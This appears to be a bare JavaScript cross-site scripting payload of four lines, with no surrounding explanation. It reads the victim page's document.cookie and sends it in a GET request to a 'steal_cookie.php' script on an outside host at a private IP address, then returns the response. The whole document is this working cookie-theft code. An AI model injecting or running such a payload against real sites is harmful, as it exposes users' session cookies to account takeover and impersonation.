var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://192.168.138.123/steal_cookie.php?cookie=" + document.cookie, false );
xmlHttp.send( null );
return xmlHttp.responseText;